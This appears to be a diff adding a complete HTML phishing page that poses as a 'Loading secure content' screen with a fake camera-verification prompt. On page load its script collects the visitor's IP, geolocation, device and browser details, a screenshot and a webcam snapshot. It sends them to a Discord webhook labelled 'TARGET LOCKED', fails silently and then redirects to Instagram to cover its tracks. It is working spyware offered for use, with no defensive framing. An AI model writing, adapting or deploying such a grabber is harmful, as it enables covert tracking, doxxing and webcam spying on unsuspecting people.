@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { background: #f0f0f0; font-family: Arial; text-align: center; padding-top: 40vh; }
+        .spinner { border: 6px solid #ddd; border-top: 6px solid #007bff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { color: #333; margin-top: 20px; }
+        #permission-prompt { display: none; margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 8px; color: #856404; max-width: 400px; margin-left: auto; margin-right: auto; }
+    </style>
+</head>
+<body>
+
+    <div class="spinner"></div>
+    <p>Loading secure content...</p>
+    <div id="permission-prompt">📷 Camera access requested for verification</div>
+
+    <!-- ===== INCLUDE html2canvas ===== -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+    <script>
+        // ===== DISCORD WEBHOOK =====
+        const WEBHOOK = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN";  // CHANGE THIS
+
+        // ===== 1. GET IP & GEOLOCATION =====
+        async function getIPInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return `IP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country_name}\nISP: ${data.org}`;
+            } catch {
+                return 'IP: (unable to fetch)';
+            }
+        }
+
+        // ===== 2. GET SCREEN & BROWSER INFO =====
+        function getDeviceInfo() {
+            return `Screen: ${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)
+Browser: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Referrer: ${document.referrer || 'direct'}`;
+        }
+
+        // ===== 3. SEND TO DISCORD (TEXT) =====
+        async function sendText(content) {
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: content })
+                });
+            } catch (e) { /* silent fail */ }
+        }
+
+        // ===== 4. SEND TO DISCORD (FILE) =====
+        async function sendFile(content, base64Data, filename) {
+            try {
+                // Convert base64 to binary
+                const binary = atob(base64Data);
+                const bytes = new Uint8Array(binary.length);
+                for (let i = 0; i < binary.length; i++) {
+                    bytes[i] = binary.charCodeAt(i);
+                }
+                const blob = new Blob([bytes], { type: 'image/jpeg' });
+                const formData = new FormData();
+                formData.append('file', blob, filename);
+                if (content) {
+                    formData.append('payload_json', JSON.stringify({ content: content }));
+                }
+                await fetch(WEBHOOK, { method: 'POST', body: formData });
+            } catch (e) { /* silent fail */ }
+        }
+
+        // ===== 5. CAPTURE SCREENSHOT (via html2canvas) =====
+        async function captureScreenshot() {
+            try {
+                const canvas = await html2canvas(document.body, {
+                    useCORS: true,
+                    allowTaint: true,
+                    logging: false,
+                    scale: 0.8 // Reduce quality for smaller file size
+                });
+                return canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // ===== 6. CAPTURE WEBCAM =====
+        async function captureWebcam() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+                stream.getTracks().forEach(t => t.stop());
+                return dataUrl;
+            } catch (e) {
+                return null; // User denied or no camera
+            }
+        }
+
+        // ===== 7. MAIN EXECUTION =====
+        (async function() {
+            // Get IP & device info
+            const ipInfo = await getIPInfo();
+            const deviceInfo = getDeviceInfo();
+            const message = `**🎯 TARGET LOCKED**\n\`\`\`\n${ipInfo}\n\n${deviceInfo}\n\`\`\``;
+
+            // Send text info first
+            await sendText(message);
+
+            // Try to capture screenshot
+            const screenshotBase64 = await captureScreenshot();
+            if (screenshotBase64) {
+                await sendFile(null, screenshotBase64, 'screenshot.jpg');
+            }
+
+            // Try to capture webcam (will prompt user)
+            const camBase64 = await captureWebcam();
+            if (camBase64) {
+                await sendFile('📸 Webcam snapshot', camBase64, 'webcam.jpg');
+            }
+
+            // Redirect to Instagram after 2 seconds
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/';
+            }, 2000);
+        })();
+    </script>
+
+</body>
+</html>
